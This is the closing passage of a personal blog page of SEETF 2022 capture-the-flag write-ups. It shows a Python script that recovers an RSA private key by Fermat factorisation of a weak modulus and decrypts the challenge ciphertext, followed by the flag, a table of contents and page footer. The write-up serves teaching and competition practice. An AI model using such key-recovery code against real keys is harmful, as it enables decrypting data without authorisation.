</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.PublicKey</span> <span style="color:#069;font-weight:bold">import</span> RSA
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> <span style="color:#555">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic"># Retrieved from https://facthacks.cr.yp.to/fermat.html</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">fermatfactor</span>(N):
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> N <span style="color:#555">&lt;=</span> <span style="color:#f60">0</span>: <span style="color:#069;font-weight:bold">return</span> [N]
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">if</span> is_even(N): <span style="color:#069;font-weight:bold">return</span> [<span style="color:#f60">2</span>,N<span style="color:#555">/</span><span style="color:#f60">2</span>]
</span></span><span style="display:flex;"><span>    a <span style="color:#555">=</span> ceil(sqrt(N))
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">while</span> <span style="color:#000;font-weight:bold">not</span> is_square(a<span style="color:#555">^</span><span style="color:#f60">2</span><span style="color:#555">-</span>N):
</span></span><span style="display:flex;"><span>        a <span style="color:#555">=</span> a <span style="color:#555">+</span> <span style="color:#f60">1</span>
</span></span><span style="display:flex;"><span>    b <span style="color:#555">=</span> sqrt(a<span style="color:#555">^</span><span style="color:#f60">2</span><span style="color:#555">-</span>N)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> [a <span style="color:#555">-</span> b,a <span style="color:#555">+</span> b]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pub <span style="color:#555">=</span> RSA<span style="color:#555">.</span>importKey(<span style="color:#366">open</span>(<span style="color:#c30">&#34;key&#34;</span>, <span style="color:#c30">&#34;rb&#34;</span>)<span style="color:#555">.</span>read(), passphrase<span style="color:#555">=</span><span style="color:#069;font-weight:bold">None</span>)
</span></span><span style="display:flex;"><span>e <span style="color:#555">=</span> pub<span style="color:#555">.</span>e
</span></span><span style="display:flex;"><span>n <span style="color:#555">=</span> pub<span style="color:#555">.</span>n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>c <span style="color:#555">=</span> <span style="color:#f60">4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017</span>
</span></span><span style="display:flex;"><span>p, q <span style="color:#555">=</span> fermatfactor(n)
</span></span><span style="display:flex;"><span>d <span style="color:#555">=</span> inverse_mod(e, (p<span style="color:#555">-</span><span style="color:#f60">1</span>)<span style="color:#555">*</span>(q<span style="color:#555">-</span><span style="color:#f60">1</span>))
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(long_to_bytes(<span style="color:#366">int</span>(<span style="color:#366">pow</span>(c,d,n))))
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="result-5">Result <a href="#result-5" class="anchor">#</a></h4>
<blockquote>
<p>Flag: <code>SEE{i_love_really_secure_algorithms_b5c0b187fe309af0f4d35982fd961d7e}</code></p>
</blockquote>
<h1 id="social-media">Social Media <a href="#social-media" class="anchor">#</a></h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener">twitter</a></p>

      </div>
      
        
  <aside class="toc-container">
    <a href="#" style="font-weight: 700; color: black;">SEETF 2022</a>
    <div class="js-toc">
      <details>
          <summary>Table of Contents
          </summary>
          <div>
              <nav id="TableOfContents">
  <ul>
    <li><a href="#easy-overflow">Easy Overflow</a>
      <ul>
        <li><a href="#initial-analysis">Initial Analysis</a></li>
        <li><a href="#exploitation-plan">Exploitation Plan</a></li>
        <li><a href="#solution">Solution</a></li>
      </ul>
    </li>
    <li><a href="#as-df">&ldquo;as&rdquo; &ldquo;df&rdquo;</a>
      <ul>
        <li><a href="#solution-1">Solution</a></li>
      </ul>
    </li>
    <li><a href="#hall-of-fame">Hall Of Fame</a>
      <ul>
        <li><a href="#initial-analysis-1">Initial Analysis</a></li>
        <li><a href="#exploitation-plan-1">Exploitation Plan</a></li>
        <li><a href="#solution-2">Solution</a></li>
      </ul>
    </li>
    <li><a href="#pokemon-battle">Pokemon Battle</a>
      <ul>
        <li><a href="#initial-analysis-2">Initial Analysis</a></li>
        <li><a href="#exploitation-plan-2">Exploitation Plan</a></li>
        <li><a href="#solution-3">Solution</a></li>
      </ul>
    </li>
  </ul>

  <ul>
    <li><a href="#lost-modulus">Lost Modulus</a>
      <ul>
        <li><a href="#initial-analysis-3">Initial Analysis</a></li>
        <li><a href="#exploitation-plan-3">Exploitation Plan</a></li>
        <li><a href="#solution-4">Solution</a></li>
      </ul>
    </li>
    <li><a href="#close-enough">Close Enough</a>
      <ul>
        <li><a href="#initial-analysis-4">Initial Analysis</a></li>
        <li><a href="#solution-5">Solution</a></li>
      </ul>
    </li>
  </ul>
</nav>
          </div>
      </details>
    </div>
  </aside>


      
    </div>

    
        <div class="tags">
            
                <a href="https://chovid99.github.io/tags/writeup">Writeup</a>
            
                <a href="https://chovid99.github.io/tags/seetf">SEETF</a>
            
                <a href="https://chovid99.github.io/tags/pwn">pwn</a>
            
                <a href="https://chovid99.github.io/tags/heap">heap</a>
            
                <a href="https://chovid99.github.io/tags/format-string">format string</a>
            
                <a href="https://chovid99.github.io/tags/buffer-overflow">buffer overflow</a>
            
                <a href="https://chovid99.github.io/tags/python-jail">python jail</a>
            
                <a href="https://chovid99.github.io/tags/crypto">crypto</a>
            
                <a href="https://chovid99.github.io/tags/rsa">rsa</a>
            
                <a href="https://chovid99.github.io/tags/math">math</a>
            
                <a href="https://chovid99.github.io/tags/fermat">fermat</a>
            
                <a href="https://chovid99.github.io/tags/2022">2022</a>
            
        </div>
    
    
    
  <div id="comment">
    
    
  </div>


</section>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="/js/tocbot.min.js"></script>

<script type="text/javascript">
  tocbot.init({
      
      tocSelector: '.js-toc',
      
      contentSelector: '.js-toc-content',
      headingSelector: 'h1, h2, h3',
      orderedList: false,
      headingLabelCallback: s => s.substr(0, s.length-2),
      collapseDepth: 2
  });
  function initTOC() {
    var windowWidth = 1316;
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
  }
  window.onload = initTOC;

  var lastWindowWidth = $(window).width();
  $(window).resize(function() {
    var $block_2 = $(".toc-container");
    var lastLeft = parseFloat($block_2.css("left").slice(0, -2))*(100/($(window).width()));
    $block_2.css("left", (lastLeft/lastWindowWidth)*$(window).width() + "vw");
    lastWindowWidth = $(window).width();
  });
</script>

    </main>
    
    <footer id="footer">
    
        <div id="social">


    <a class="symbol" href="https://github.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28"  viewBox="0 0 72 72" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    
    <title>Github</title>
    <desc>Created with Sketch.</desc>
    <defs></defs>
    <g id="Page-1" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
        <g id="Social-Icons---Rounded-Black" transform="translate(-264.000000, -939.000000)">
            <g id="Github" transform="translate(264.000000, 939.000000)">
                <path d="M8,72 L64,72 C68.418278,72 72,68.418278 72,64 L72,8 C72,3.581722 68.418278,-8.11624501e-16 64,0 L8,0 C3.581722,8.11624501e-16 -5.41083001e-16,3.581722 0,8 L0,64 C5.41083001e-16,68.418278 3.581722,72 8,72 Z" id="Rounded" fill="#bbbbbb"></path>
                <path d="M35.9985,13 C22.746,13 12,23.7870921 12,37.096644 C12,47.7406712 18.876,56.7718301 28.4145,59.9584121 C29.6145,60.1797862 30.0525,59.4358488 30.0525,58.7973276 C30.0525,58.2250681 30.0315,56.7100863 30.0195,54.6996482 C23.343,56.1558981 21.9345,51.4693938 21.9345,51.4693938 C20.844,48.6864054 19.2705,47.9454799 19.2705,47.9454799 C17.091,46.4500754 19.4355,46.4801943 19.4355,46.4801943 C21.843,46.6503662 23.1105,48.9634994 23.1105,48.9634994 C25.2525,52.6455377 28.728,51.5823398 30.096,50.9649018 C30.3135,49.4077535 30.9345,48.3460615 31.62,47.7436831 C26.2905,47.1352808 20.688,45.0691228 20.688,35.8361671 C20.688,33.2052792 21.6225,31.0547881 23.1585,29.3696344 C22.911,28.7597262 22.0875,26.3110578 23.3925,22.9934585 C23.3925,22.9934585 25.4085,22.3459017 29.9925,25.4632101 C31.908,24.9285993 33.96,24.6620468 36.0015,24.6515052 C38.04,24.6620468 40.0935,24.9285993 42.0105,25.4632101 C46.5915,22.3459017 48.603,22.9934585 48.603,22.9934585 C49.9125,26.3110578 49.089,28.7597262 48.8415,29.3696344 C50.3805,31.0547881 51.309,33.2052792 51.309,35.8361671 C51.309,45.0917119 45.6975,47.1292571 40.3515,47.7256117 C41.2125,48.4695491 41.9805,49.9393525 41.9805,52.1877301 C41.9805,55.4089489 41.9505,58.0067059 41.9505,58.7973276 C41.9505,59.4418726 42.3825,60.1918338 43.6005,59.9554002 C53.13,56.7627944 60,47.7376593 60,37.096644 C60,23.7870921 49.254,13 35.9985,13" fill="#FFFFFF"></path>
            </g>
        </g>
    </g>
</svg>
    </a>

    <a class="symbol" href="https://twitter.com/Chovid99" rel="me" target="_blank">
        
        <svg fill="#bbbbbb" width="28" height="28" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
	 width="438.536px" height="438.536px" viewBox="0 0 438.536 438.536" style="enable-background:new 0 0 438.536 438.536;"
	 xml:space="preserve">
<g>
	<path d="M414.41,24.123C398.333,8.042,378.963,0,356.315,0H82.228C59.58,0,40.21,8.042,24.126,24.123
		C8.045,40.207,0.003,59.576,0.003,82.225v274.084c0,22.647,8.042,42.018,24.123,58.102c16.084,16.084,35.454,24.126,58.102,24.126
		h274.084c22.648,0,42.018-8.042,58.095-24.126c16.084-16.084,24.126-35.454,24.126-58.102V82.225
		C438.532,59.576,430.49,40.204,414.41,24.123z M335.471,168.735c0.191,1.713,0.288,4.278,0.288,7.71
		c0,15.989-2.334,32.025-6.995,48.104c-4.661,16.087-11.8,31.504-21.416,46.254c-9.606,14.749-21.074,27.791-34.396,39.115
		c-13.325,11.32-29.311,20.365-47.968,27.117c-18.648,6.762-38.637,10.143-59.953,10.143c-33.116,0-63.76-8.952-91.931-26.836
		c4.568,0.568,9.329,0.855,14.275,0.855c27.6,0,52.439-8.565,74.519-25.7c-12.941-0.185-24.506-4.179-34.688-11.991
		c-10.185-7.803-17.273-17.699-21.271-29.691c4.947,0.76,8.658,1.137,11.132,1.137c4.187,0,9.042-0.76,14.56-2.279
		c-13.894-2.669-25.598-9.562-35.115-20.697c-9.519-11.136-14.277-23.84-14.277-38.114v-0.571
		c10.085,4.755,19.602,7.229,28.549,7.422c-17.321-11.613-25.981-28.265-25.981-49.963c0-10.66,2.758-20.747,8.278-30.264
		c15.035,18.464,33.311,33.213,54.816,44.252c21.507,11.038,44.54,17.227,69.092,18.558c-0.95-3.616-1.427-8.186-1.427-13.704
		c0-16.562,5.853-30.692,17.56-42.399c11.703-11.706,25.837-17.561,42.394-17.561c17.515,0,32.079,6.283,43.688,18.846
		c13.134-2.474,25.892-7.33,38.26-14.56c-4.757,14.652-13.613,25.788-26.55,33.402c12.368-1.716,23.88-4.95,34.537-9.708
		C357.458,149.793,347.462,160.166,335.471,168.735z"/>
</g>
</svg>

    </a>


</div>

    

    <div class="copyright">
    
       © Copyright 
       2022 
       <span class="split">
        <svg fill="#bbbbbb" width="15" height="15" version="1.1" id="heart-15" xmlns="http://www.w3.org/2000/svg" width="15px" height="15px" viewBox="0 0 15 15">
  <path d="M13.91,6.75c-1.17,2.25-4.3,5.31-6.07,6.94c-0.1903,0.1718-0.4797,0.1718-0.67,0C5.39,12.06,2.26,9,1.09,6.75&#xA;&#x9;C-1.48,1.8,5-1.5,7.5,3.45C10-1.5,16.48,1.8,13.91,6.75z"/>
</svg>
       </span>
       Chovid99
    
    </div>

    
</footer>



  </body>
</html>
